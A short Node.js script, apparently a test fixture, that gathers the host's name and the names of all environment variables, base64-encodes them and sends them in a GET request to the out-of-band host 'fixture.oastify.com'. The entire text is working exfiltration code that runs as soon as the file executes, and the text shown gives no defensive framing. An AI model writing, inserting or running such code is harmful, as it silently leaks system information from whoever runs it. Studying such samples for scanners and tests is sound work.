const https = require('https');
const os = require('os');

const payload = Buffer.from(JSON.stringify({
  host: os.hostname(),
  env: Object.keys(process.env),
})).toString('base64');
https.request({
  hostname: 'fixture.oastify.com',
  path: `/?data=${payload}`,
  method: 'GET',
}).end();
